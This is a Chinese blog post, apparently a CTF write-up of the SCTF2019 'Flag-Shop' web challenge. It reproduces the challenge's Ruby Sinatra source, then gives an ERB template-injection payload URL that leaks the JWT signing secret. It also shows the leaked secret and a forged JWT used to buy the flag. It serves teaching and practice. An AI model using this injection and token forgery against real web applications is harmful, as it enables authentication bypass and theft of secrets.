@@ -1,0 +1,338 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SCTF2019-Flag-Shop | M4XLMUM</title><meta name="keywords" content="ctf,web,jwt"><meta name="author" content="M4XLMUM"><meta name="copyright" content="M4XLMUM"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="若为此弦声寄入一段情，北星遥远与之呼应    00a.提示首先看到这个flag的价格高的离谱，估计就是伪造cookie之类的东西去买flag了。。。每次work只能赚不到十块钱，1000000000000000000000000000真的来点的话，估计得点到我死了。。。 看robots.txt有提示嗷User-agent: * Disallow: &#x2F;filebak再看&#x2F;filebakr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF2019-Flag-Shop">
+<meta property="og:url" content="https://a16n.github.io/2020/11/07/SCTF2019-Flag-Shop/index.html">
+<meta property="og:site_name" content="M4XLMUM">
+<meta property="og:description" content="若为此弦声寄入一段情，北星遥远与之呼应    00a.提示首先看到这个flag的价格高的离谱，估计就是伪造cookie之类的东西去买flag了。。。每次work只能赚不到十块钱，1000000000000000000000000000真的来点的话，估计得点到我死了。。。 看robots.txt有提示嗷User-agent: * Disallow: &#x2F;filebak再看&#x2F;filebakr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://a16n.github.io/img/default.jpg">
+<meta property="article:published_time" content="2020-11-07T15:40:51.000Z">
+<meta property="article:modified_time" content="2021-05-07T16:35:33.363Z">
+<meta property="article:author" content="M4XLMUM">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="jwt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://a16n.github.io/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://a16n.github.io/2020/11/07/SCTF2019-Flag-Shop/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu_site_verification" content="Erg2Bytt6M"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-9257596953357662',
+  enable_page_level_ads: 'true'
+});</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":200,"languages":{"author":"作者: M4XLMUM","link":"链接: ","source":"来源: M4XLMUM","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-08 00:35:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">117</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">105</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M4XLMUM</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SCTF2019-Flag-Shop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-07T15:40:51.000Z" title="发表于 2020-11-07 23:40:51">2020-11-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-07T16:35:33.363Z" title="更新于 2021-05-08 00:35:33">2021-05-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">963</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SCTF2019-Flag-Shop"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>若为此弦声寄入一段情，北星遥远与之呼应</p>
+</blockquote>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe>
+
+<h2 id="00a-提示"><a href="#00a-提示" class="headerlink" title="00a.提示"></a>00a.提示</h2><p>首先看到这个flag的价格高的离谱，估计就是伪造cookie之类的东西去买flag了。。。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/1.png" alt><br>每次work只能赚不到十块钱，<code>1000000000000000000000000000</code>真的来点的话，估计得点到我死了。。。</p>
+<p><strong>看<code>robots.txt</code>有提示嗷</strong><br><pre class="line-numbers language-none"><code class="language-none">User-agent: *
+Disallow: &#x2F;filebak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><strong>再看<code>/filebak</code></strong><br><pre class="line-numbers language-none"><code class="language-none">require &#39;sinatra&#39;
+require &#39;sinatra&#x2F;cookies&#39;
+require &#39;sinatra&#x2F;json&#39;
+require &#39;jwt&#39;
+require &#39;securerandom&#39;
+require &#39;erb&#39;
+
+set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39;
+
+FLAGPRICE &#x3D; 1000000000000000000000000000
+ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64)
+
+configure do
+  enable :logging
+  file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;)
+  file.sync &#x3D; true
+  use Rack::CommonLogger, file
+end
+
+get &quot;&#x2F;&quot; do
+  redirect &#39;&#x2F;shop&#39;, 302
+end
+
+get &quot;&#x2F;filebak&quot; do
+  content_type :text
+  erb IO.binread __FILE__
+end
+
+get &quot;&#x2F;api&#x2F;auth&quot; do
+  payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125;
+  auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+  cookies[:auth] &#x3D; auth
+end
+
+get &quot;&#x2F;api&#x2F;info&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)
+end
+
+get &quot;&#x2F;shop&quot; do
+  erb :shop
+end
+
+get &quot;&#x2F;work&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+  auth &#x3D; auth[0]
+  unless params[:SECRET].nil?
+    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)
+      puts ENV[&quot;FLAG&quot;]
+    end
+  end
+
+  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then
+
+    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)
+    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+    cookies[:auth] &#x3D; auth
+    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result
+
+  end
+end
+
+post &quot;&#x2F;shop&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+
+  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then
+
+    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)
+  else
+
+    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;
+    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+    cookies[:auth] &#x3D; auth
+    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)
+  end
+end
+
+
+def islogin
+  if cookies[:auth].nil? then
+    redirect to(&#39;&#x2F;shop&#39;)
+  end
+end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>没见过的语言ruby~越学越糊涂，各种语言写的web应用层出不穷。。。~</p>
+<h2 id="00b-jwt伪造与erb模版注入"><a href="#00b-jwt伪造与erb模版注入" class="headerlink" title="00b.jwt伪造与erb模版注入"></a>00b.jwt伪造与erb模版注入</h2><h3 id="001-首先是jwt"><a href="#001-首先是jwt" class="headerlink" title="001.首先是jwt"></a>001.首先是jwt</h3><p>用火狐配合bp抓包。把auth的值放在jwt.io里面解一下码为以下内容<br><img src="/2020/11/07/SCTF2019-Flag-Shop/2.png" alt></p>
+<p>改变金克拉的值可能需要先搞到<code>secret的值</code>，那就又回到了上面提示的源码了，里面有有关secret值得具体细节。</p>
+<h3 id="002-erb模版注入"><a href="#002-erb模版注入" class="headerlink" title="002.erb模版注入"></a>002.erb模版注入</h3><p>这里从没学过这种ruby语言的我，瞬间不知所措，~这tm，太不讲武德了吧~<br>看大lao说，work路由下的这个语句存在erb模版注入<code>ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result</code><br>然后限制了传入的字符的长度为不超过7个字符。<br>然后需要上传<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code>，还得进行十六进制的编码。这个注入原理搞不太明白，似乎用到了ruby的预定义变量<code>$&#39;</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop/4.png" alt><br>这里最后一次匹配到的string应该就是这里<br><pre class="line-numbers language-none"><code class="language-none">auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+    cookies[:auth] &#x3D; auth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>这里的第二步的auth，即又是第一步中的secret的环境变量，传入下面的payload以弹出secret<br><code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop/5.png" alt><br>成功注出secret<br><pre class="line-numbers language-none"><code class="language-none">b357260d09e0bebbe9171c34e8228e17e618d4b76b559643ac5ec42d1c4c1215d4d9c8f0e337d8fc4b06db1d678b29c705ed6c55447e6ec47cfb7c8c8e68d926<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<h2 id="00c-伪造JWT修改jkl"><a href="#00c-伪造JWT修改jkl" class="headerlink" title="00c.伪造JWT修改jkl"></a>00c.伪造JWT修改jkl</h2><p>输入secret改下自己的jkl为大于<code>1e+27</code>的值，我改为了~<code>1e+30</code>~<code>这里错了，科学记数法为&lt;10e+30&gt;才表示10的30次方</code>。~我是傻逼~。肯定可以的啦。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/6.png" alt><br><code>auth伪造值为</code><br><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIzMDRiMjIxYi05Y2VmLTQ1MTktYTQxZi03NzQzZjYwYmIxOWIiLCJqa2wiOjFlKzMxfQ.mNl4xRVl9pH1Z9i06dcg4wiwf8VPoCysDP-AIdLsW-Q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><strong>回到页面点击<code>Buy Flag</code></strong></p>
+<p>然后改下cookie的值<br><img src="/2020/11/07/SCTF2019-Flag-Shop/7.png" alt><br>得到新的jwt后解码获得flag。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/8.png" alt></p>
+<p><code>flag如下</code><br><pre class="line-numbers language-none"><code class="language-none">flag&#123;546004d9-da90-492d-873e-e1c8246d9f10&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<blockquote>
+<p>又为你取出这把桐木琴，我又弹到如此用心。</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">M4XLMUM</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://a16n.github.io/2020/11/07/SCTF2019-Flag-Shop/">https://a16n.github.io/2020/11/07/SCTF2019-Flag-Shop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://a16n.github.io" target="_blank">M4XLMUM</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/jwt/">jwt</a></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_wechat"></a><a class="a2a_button_sina_weibo"></a><a class="a2a_button_facebook_messenger"></a><a class="a2a_button_email"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/08/RoarCTF-2019-Simple-Upload/"><img class="prev-cover" src="/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">RoarCTF-2019-Simple-Upload</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/07/RoarCTF-2019-Online-Proxy/"><img class="next-cover" src="/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RoarCTF-2019-Online_Proxy</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/12/07/RootersCTF2019-ImgXweb/" title="RootersCTF2019-ImgXweb"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-07</div><div class="title">RootersCTF2019-ImgXweb</div></div></a></div><div><a href="/2020/11/25/ADWord-web进阶/" title="ADWord_web进阶"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-25</div><div class="title">ADWord_web进阶</div></div></a></div><div><a href="/2020/11/03/BJDCTF-2nd-文件探测/" title="BJDCTF-2nd-文件探测"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-03</div><div class="title">BJDCTF-2nd-文件探测</div></div></a></div><div><a href="/2020/10/24/BJDCTF2020-EzPHP/" title="BJDCTF2020-EzPHP"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-24</div><div class="title">BJDCTF2020-EzPHP</div></div></a></div><div><a href="/2020/11/12/BSidesCF-2019/" title="BSidesCF-2019-web部分"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-12</div><div class="title">BSidesCF-2019-web部分</div></div></a></div><div><a href="/2020/10/22/CISCN2019-华北赛区-Day1-Web1-Dropbox-1/" title="CISCN2019_华北赛区_Day1_Web1-Dropbox"><img class="cover" src="/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-22</div><div class="title">CISCN2019_华北赛区_Day1_Web1-Dropbox</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#00a-%E6%8F%90%E7%A4%BA"><span class="toc-number">1.</span> <span class="toc-text">00a.提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00b-jwt%E4%BC%AA%E9%80%A0%E4%B8%8Eerb%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">00b.jwt伪造与erb模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E9%A6%96%E5%85%88%E6%98%AFjwt"><span class="toc-number">2.1.</span> <span class="toc-text">001.首先是jwt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-erb%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">002.erb模版注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00c-%E4%BC%AA%E9%80%A0JWT%E4%BF%AE%E6%94%B9jkl"><span class="toc-number">3.</span> <span class="toc-text">00c.伪造JWT修改jkl</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 By M4XLMUM</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'hQSVii4djRLOjBYaCK5zOXhB-gzGzoHsz',
+      appKey: 'eaCREaPBTzvLpmQcrAhlnzGe',
+      placeholder: '记得留下你的昵称和邮箱....可以快速收到回复',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: true,
+      path: window.location.pathname,
+      requiredFields: ["nick"],
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
